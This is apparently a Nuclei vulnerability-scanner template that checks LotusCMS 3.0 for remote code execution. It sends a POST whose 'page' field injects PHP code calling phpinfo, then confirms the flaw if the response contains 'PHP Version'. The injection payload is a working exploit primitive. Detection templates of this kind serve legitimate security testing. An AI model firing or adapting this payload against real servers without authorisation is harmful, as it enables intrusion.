id: lotuscms-rce

info:
  name: LotusCMS 3.0 - RCE
  author: pikpikcu
  severity: critical
  reference: https://github.com/Hood3dRob1n/LotusCMS-Exploit
  tags: lotuscms,rce

requests:
  - method: POST
    path:
      - "{{BaseURL}}/index.php"
 #     - "{{BaseURL}}/lcms/index.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      page=index');${system(phpinfo())};#

    matchers-condition: and
    matchers:

      - type: word
        words:
          - "PHP Version"
        part: body

      - type: status
        status:
          - 200
